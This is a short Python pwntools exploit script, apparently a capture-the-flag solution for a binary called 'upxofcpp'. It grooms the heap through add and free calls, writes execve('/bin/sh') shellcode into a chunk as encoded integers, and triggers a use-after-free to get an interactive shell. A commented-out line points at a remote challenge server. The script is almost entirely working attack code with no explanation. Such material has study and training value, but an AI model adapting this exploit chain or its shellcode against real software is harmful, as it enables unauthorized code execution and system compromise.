from pwn import *
def cmd(c):
	p.sendlineafter("ice:",str(c))
def add(idx,size,data="-1"):
	cmd(1)
	p.sendlineafter("dex:",str(idx))
	p.sendlineafter("ize:",str(size))
	p.sendlineafter("stop:",data)
def free(idx):
	cmd(2)
	p.sendlineafter("dex:",str(idx))
def show(idx):
	cmd(4)
	p.sendlineafter("dex:",str(idx))
#context.log_level='debug'
p=process('./upxofcpp')
#p=remote("34.92.121.149",10000)
context.arch='amd64'
add(0,0x68/4)
add(1,0x68/4)
add(2,0x100/4)
free(0)
free(1)
free(2)
raw='''
xor rsi,rsi
xor rdx,rdx
xor rax,rax
mov al,0x3b
mov rdi,0x0068732f6e69622f
nop
push rdi
mov rdi,rsp
syscall
'''
#>0x80000000will crash so nop...
raw=asm(raw).ljust(0x30,'\x00')+asm('jmp .-0x30')
s=''
for x in range(0,0x38,4):
	s+=str(u32(raw[x:x+4].ljust(4,'\x00')))+"\n"
add(3,0x38/4,s)
#gdb.attach(p,'b *0x000555555555723')
free(1)
p.interactive()
